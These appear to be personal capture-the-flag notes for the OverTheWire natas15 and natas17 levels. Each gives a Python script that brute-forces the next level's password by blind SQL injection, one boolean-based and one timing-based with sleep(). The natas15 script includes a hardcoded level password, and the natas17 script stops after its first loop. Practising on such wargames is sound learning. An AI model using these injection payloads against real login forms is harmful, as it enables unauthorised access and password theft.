# CTF Notes

### natas15
From the natas15 challenge. This is an SQL bruteforce where if the character exsists in the password, it will print "exists". Because of the output we can check whether or not we are correct through checkin if "exists" is in the content body of the response. using `requests` this can be done quite easily. The SQL query uses LIKE BINARY which is case-sensitive in order to get the correct values.

The second for loop in the script cycles 32 times (typical length of the password) and matches the exact places. %{}% matches if present in any position. {}% matches if its at the beginning (in this case to brute force the correct order). Therefore %{} would match if character was at the end.

```py
import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""

for char in chars:
    input_data = {'username' : 'natas16" and password LIKE BINARY "%{}%" # '.format(char)}
    r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = input_data)
    if "exists" in r.text:
        filtered += char

print(filtered)

for _ in range(0, 32):
    for char in filtered:
        input_data = {'username' : 'natas16" and password LIKE BINARY "{}%" # '.format(passwd + char)}
        r = requests.post("http://natas15.natas.labs.overthewire.org/index.php?debug", auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = input_data)
        if "exists" in r.text:
            passwd += char
            print(passwd)
            break
```

### natas17

source: https://www.abatchy.com/2016/12/natas-level-17
From the natas17 challenge. Bruteforce password through SQL injection though there is not output. If there is no output use the `AND sleep()` command in the query to control the response time. If the query was correct i.e char is in there, the `sleep()` will trigger and the response time will be slower. This can be checked in python using `requests`.

```py
import requests
from requests.auth import HTTPBasicAuth

url = "http://natas17.natas.labs.overthewire.org/index.php?debug"
auth_user = "natas17"
auth_pass = "<censored>"

chars = "abcdefghijklmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = ""
passwd = ""


for char in chars: # checks which characters are in the password
    # if the query is successful it will add a 1 second relay
    input_data = {"username": 'natas18" and password LIKE BINARY "%{}%" AND sleep(1) # '.format(char)}
    r = requests.post(url, auth=HTTPBasicAuth(auth_user, auth_pass), data=input_data)
    if "01." in str(r.elapsed): # "01." specifies that the response took 1 second, from sleep(), can increase if network is slower
        print(r.elapsed, char)
        filtered += char

```
